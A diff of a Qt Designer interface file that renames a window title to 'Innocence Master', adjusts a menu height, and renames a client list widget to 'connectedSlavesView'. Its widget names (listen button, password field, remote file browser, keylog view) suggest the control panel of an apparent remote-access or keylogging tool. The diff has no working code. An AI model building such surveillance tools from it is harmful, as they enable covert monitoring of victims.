@@ -23,7 +23,7 @@
    <bool>false</bool>
   </property>
   <property name="windowTitle">
-   <string comment="Enhanced v2 Client">TheSleeper</string>
+   <string comment="Enhanced v2 Client">Innocence Master</string>
   </property>
   <property name="windowIcon">
    <iconset resource="../thesleeper.qrc">
@@ -452,7 +452,7 @@
      <x>0</x>
      <y>0</y>
      <width>954</width>
-     <height>21</height>
+     <height>18</height>
     </rect>
    </property>
    <widget class="QMenu" name="menuClient">
@@ -511,7 +511,7 @@
      <item>
       <layout class="QVBoxLayout" name="serversTreeLayout">
        <item>
-        <widget class="QTableView" name="connectedClientsView">
+        <widget class="QTableView" name="connectedSlavesView">
          <property name="editTriggers">
           <set>QAbstractItemView::NoEditTriggers</set>
          </property>
@@ -696,7 +696,7 @@
   <tabstop>listenButton</tabstop>
   <tabstop>portBox</tabstop>
   <tabstop>passEdit</tabstop>
-  <tabstop>connectedClientsView</tabstop>
+  <tabstop>connectedSlavesView</tabstop>
   <tabstop>remoteFilesView</tabstop>
   <tabstop>localFilesView</tabstop>
   <tabstop>keylogEdit</tabstop>
